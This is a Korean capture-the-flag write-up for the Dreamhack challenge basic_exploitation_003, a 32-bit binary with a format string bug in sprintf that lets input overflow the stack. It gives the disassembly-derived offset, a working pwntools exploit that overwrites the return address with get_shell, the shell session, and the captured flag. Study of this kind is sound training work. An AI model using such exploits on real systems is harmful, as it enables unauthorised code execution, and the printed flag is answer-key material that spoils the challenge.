# Stage10_basic_exploitation_003[문제]

## 1. 파일 확인

- unzip 명령어로 파일 압축 해제

```bash
$ unzip 4087ea17-938c-464f-a767-feac4da62951.zip 
Archive:  4087ea17-938c-464f-a767-feac4da62951.zip
  inflating: basic_exploitation_003.c  
  inflating: basic_exploitation_003
```

- ls -al 명령어로 파일 목록 확인

```bash
$ ls -al
total 24
drwxrwxr-x  2 magan20 magan20 4096 11월 26 04:30 .
drwxrwxr-x 19 magan20 magan20 4096 11월 26 03:42 ..
-rw-rw-r--  1 magan20 magan20 3607 11월 26 03:43 4087ea17-938c-464f-a767-feac4da62951.zip
-rwxr-xr-x  1 magan20 magan20 7836  4월  1  2020 basic_exploitation_003
-rw-r--r--  1 magan20 magan20  575  4월  1  2020 basic_exploitation_003.c
magan20@magan20:~/dreamha
```

- file 명령어로 basic_exploitation_003 파일 확인

```bash
$ file basic_exploitation_003
basic_exploitation_003: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e2d5f4ca6087b4fcbb06378064e4e167643a1b5d, not stripped
```

basic_exploitation_002 파일은 32bit ELF 파일이다.

- cat 명령어로 basic_exploitation_003 파일 내용 확인

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf); // format string bug 및 overflow 발생
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```

## 2. 시나리오 작성

- sprintf(stack_buf, heap_buf); 를 보면 stack_buf 에서 format string 버그가 발생하지만 heap 에서 stack 으로 overflow 취약점도 발생한다.
- format string 버그로 overflow 를 일으킨 후에 return address 에 get_shell 함수의 주소를 덮어씌우면 된다.

## 3. 필요 정보 확인

1. stack_buf 와 return address 사이의 바이트 수

```bash
gef➤  disas main
Dump of assembler code for function main:
   0x0804867c <+0>:	push   ebp
   0x0804867d <+1>:	mov    ebp,esp
   0x0804867f <+3>:	push   edi
   0x08048680 <+4>:	sub    esp,0x94
   0x08048686 <+10>:	push   0x80
   0x0804868b <+15>:	call   0x8048490 <malloc@plt>
   0x08048690 <+20>:	add    esp,0x4
   0x08048693 <+23>:	mov    DWORD PTR [ebp-0x8],eax
   0x08048696 <+26>:	lea    edx,[ebp-0x98]
   0x0804869c <+32>:	mov    eax,0x0
   0x080486a1 <+37>:	mov    ecx,0x24
   0x080486a6 <+42>:	mov    edi,edx
   0x080486a8 <+44>:	rep stos DWORD PTR es:[edi],eax
   0x080486aa <+46>:	call   0x8048622 <initialize>
   0x080486af <+51>:	push   0x80
   0x080486b4 <+56>:	push   DWORD PTR [ebp-0x8]
   0x080486b7 <+59>:	push   0x0
=> 0x080486b9 <+61>:	call   0x8048450 <read@plt>
   0x080486be <+66>:	add    esp,0xc
   0x080486c1 <+69>:	push   DWORD PTR [ebp-0x8]
   0x080486c4 <+72>:	lea    eax,[ebp-0x98]
   0x080486ca <+78>:	push   eax
   0x080486cb <+79>:	call   0x80484f0 <sprintf@plt>
   0x080486d0 <+84>:	add    esp,0x8
   0x080486d3 <+87>:	lea    eax,[ebp-0x98]
   0x080486d9 <+93>:	push   eax
   0x080486da <+94>:	push   0x8048791
   0x080486df <+99>:	call   0x8048460 <printf@plt>
   0x080486e4 <+104>:	add    esp,0x8
   0x080486e7 <+107>:	mov    eax,0x0
   0x080486ec <+112>:	mov    edi,DWORD PTR [ebp-0x4]
   0x080486ef <+115>:	leave  
   0x080486f0 <+116>:	ret    
End of assembler dump.
```

main+72 에서 main+79 를 보면 sprintf 함수의 첫번째 인자로 ebp-0x98 의 주소를 스택에 넣고 있다. 

sprintf 함수의 첫번째 인자는  stack_buf 이므로 stack_buf 의 위치를 ebp-0x98 이다.

```bash
   0x080486c4 <+72>:	lea    eax,[ebp-0x98]
   0x080486ca <+78>:	push   eax
   0x080486cb <+79>:	call   0x80484f0 <sprintf@plt>
```

- return address 의 위치 : ebp + 0x4
- stack_buf 의 위치 : ebp - 0x98
- stack_buf 와 return address 사이의 바이트 수 : ebp + 0x4 - (ebp - 0x98) = 0x9c = 156

1. get_shell() 주소 확인

```bash
gef➤  p get_shell
$1 = {<text variable, no debug info>} 0x8048669 <get_shell>
```

- get_shell 주소 : 0x8048669

## 4. 페이로드 작성

1. 페이로드 작성

```python
from pwn import *

p = process("./basic_exploitation_003")
e = ELF("./basic_exploitation_003")

get_shell = 0x8048669

payload = b""
payload += b"%156c"
payload += p32(get_shell)

p.sendline(payload)
p.interactive()
```

1. 로컬 공격

```bash
$ python3 payload.py 
[+] Starting local process './basic_exploitation_003': pid 21326
[*] '/home/magan20/dreamhack/system/basic_exploitation_003/basic_exploitation_003'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
ECHO :                                                                                                                                                             i\x86\x04

$ id
uid=1000(magan20) gid=1000(magan20) groups=1000(magan20),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
```

## 5. 공격

1. 접속 정보 확인

```bash
Host: host3.dreamhack.games
Port: 19711/tcp
```

1. 페이로드 수정

```python
from pwn import *

#p = process("./basic_exploitation_003")
p = remote("host3.dreamhack.games", 19711)
e = ELF("./basic_exploitation_003")

get_shell = 0x8048669

payload = b""
payload += b"%156c"
payload += p32(get_shell)

p.sendline(payload)
p.interactive()
```

1. 공격
```bash
$ python3 payload.py
[+] Opening connection to host3.dreamhack.games on port 19711: Done
[*] '/home/magan20/dreamhack/system/basic_exploitation_003/basic_exploitation_003'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
ECHO :                                                                                                                                                             i\x86\x04

$ id
uid=1000(basic_exploitation_003) gid=1000(basic_exploitation_003) groups=1000(basic_exploitation_003)
$ cat flag
DH{4e6e355c62249b2da3b566f0d575007e}
$
```
